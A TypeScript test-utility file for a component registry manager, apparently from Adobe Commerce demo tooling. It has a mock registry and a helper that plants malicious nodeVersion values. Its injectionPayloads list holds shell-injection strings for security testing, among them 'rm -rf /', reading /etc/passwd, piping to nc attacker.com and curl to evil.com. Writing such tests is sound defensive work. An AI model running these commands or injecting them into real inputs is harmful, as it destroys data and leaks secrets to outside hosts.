/**
 * Shared test utilities for ComponentRegistryManager tests
 *
 * MOCK DERIVATION PATTERN:
 * This mock is derived from templates/components.json current structure.
 * When components.json schema changes:
 * 1. Update mockRawRegistry to match new structure
 * 2. Update tests/templates/type-json-alignment.test.ts to validate new fields
 *
 * See tests/README.md "Mock Derivation Guidelines" for full documentation.
 *
 * NOTE: Mock declarations must be in each test file (Jest hoisting requirement).
 * This file contains only shared test data and helper functions.
 */

import type { RawComponentRegistry } from '@/types';

/**
 * Sample raw registry data for testing (current structure)
 *
 * Uses separate top-level sections (frontends, backends, mesh, etc.)
 * matching the current templates/components.json structure.
 *
 * IMPORTANT: Keep this mock aligned with actual templates/components.json.
 * All top-level sections must be represented. See type-json-alignment.test.ts for validation.
 */
export const mockRawRegistry: RawComponentRegistry = {
    version: '3.0.0',
    selectionGroups: {
        frontends: ['eds', 'headless'],
        backends: ['adobe-commerce-paas'],
        dependencies: ['demo-inspector'],
        integrations: ['experience-platform'],
        appBuilderApps: ['integration-service'],
    },
    frontends: {
        eds: {
            id: 'eds',
            name: 'Edge Delivery Services',
            description: 'EDS storefront',
            type: 'frontend',
            compatibleBackends: ['adobe-commerce-paas'],
            dependencies: {
                required: ['demo-inspector'],
                optional: [],
            },
            configuration: {
                // No nodeVersion - EDS runs on Edge Delivery, not local Node
                requiredEnvVars: ['VAR1', 'VAR2'],
            },
        },
        headless: {
            id: 'headless',
            name: 'Headless Storefront',
            description: 'Next.js headless storefront',
            type: 'frontend',
            // Note: No compatibleBackends - used to test incompatible frontend scenarios
            configuration: {
                nodeVersion: '24', // Next.js requires Node for local dev
                requiredEnvVars: ['MESH_ENDPOINT'],
            },
        },
    },
    backends: {
        'adobe-commerce-paas': {
            id: 'adobe-commerce-paas',
            name: 'Adobe Commerce PaaS',
            description: 'Adobe Commerce DSN instance',
            type: 'backend',
            configuration: {
                // No nodeVersion - PaaS is a remote Commerce instance
            },
        },
    },
    mesh: {
        'commerce-mesh': {
            id: 'commerce-mesh',
            name: 'Adobe Commerce API Mesh',
            description: 'GraphQL gateway',
            type: 'dependency',
            subType: 'mesh',
            configuration: {
                nodeVersion: '20',
            },
        },
    },
    dependencies: {
        'demo-inspector': {
            id: 'demo-inspector',
            name: 'Demo Inspector',
            description: 'Interactive inspector overlay',
            type: 'dependency',
            subType: 'inspector',
            // No nodeVersion - demo-inspector is a browser overlay, not a Node.js tool
        },
    },
    appBuilderApps: {
        'integration-service': {
            id: 'integration-service',
            name: 'Kukla Integration Service',
            description: 'Custom integration service',
            type: 'app-builder',
            configuration: {
                nodeVersion: '22',
            },
        },
    },
    integrations: {
        'experience-platform': {
            id: 'experience-platform',
            name: 'Experience Platform',
            description: 'Adobe Experience Platform integration',
            type: 'integration',
        },
    },
    infrastructure: {
        'adobe-cli': {
            id: 'adobe-cli',
            name: 'Adobe I/O CLI & SDK',
            description: 'Command-line interface',
            type: 'external-system',
        },
    },
    services: {},
    envVars: {},
};

/**
 * Component section names for iteration and validation
 */
export const COMPONENT_SECTIONS = [
    'frontends',
    'backends',
    'mesh',
    'dependencies',
    'appBuilderApps',
] as const;

export type ComponentSection = (typeof COMPONENT_SECTIONS)[number];

/**
 * Known injection payloads for security testing
 */
export const injectionPayloads = [
    '20; rm -rf /',
    '20 && cat /etc/passwd',
    '20 | nc attacker.com 1234',
    '20`whoami`',
    '20$(id)',
    "20' OR '1'='1",
    '20\nrm -rf /',
    '20;$(curl evil.com)',
    '20 & curl http://evil.com',
];

/**
 * Get the mock ConfigurationLoader instance
 * Note: Gets the LAST instance created (most recent)
 */
export function getMockLoader(): any {
    const { ConfigurationLoader } = require('@/core/config/ConfigurationLoader');
    const instances = ConfigurationLoader.mock.results;
    return instances[instances.length - 1]?.value;
}

/**
 * Create a modified registry with malicious nodeVersion in specific component
 *
 * @param componentPath - Path like "frontends.eds" or "infrastructure.adobe-cli"
 * @param maliciousVersion - Malicious nodeVersion value to inject
 */
export function createMaliciousRegistry(
    componentPath: string,
    maliciousVersion: string
): RawComponentRegistry {
    const [section, componentId] = componentPath.split('.');

    if (section === 'infrastructure') {
        return {
            ...mockRawRegistry,
            infrastructure: {
                ...mockRawRegistry.infrastructure,
                [componentId]: {
                    ...mockRawRegistry.infrastructure![componentId],
                    configuration: {
                        ...mockRawRegistry.infrastructure![componentId].configuration,
                        nodeVersion: maliciousVersion,
                    },
                },
            },
        };
    }

    if (COMPONENT_SECTIONS.includes(section as ComponentSection)) {
        const sectionData = mockRawRegistry[section as ComponentSection] as Record<string, any>;
        return {
            ...mockRawRegistry,
            [section]: {
                ...sectionData,
                [componentId]: {
                    ...sectionData[componentId],
                    configuration: {
                        ...sectionData[componentId]?.configuration,
                        nodeVersion: maliciousVersion,
                    },
                },
            },
        };
    }

    throw new Error(`Unknown section: ${section}. Valid sections: ${COMPONENT_SECTIONS.join(', ')}, infrastructure`);
}
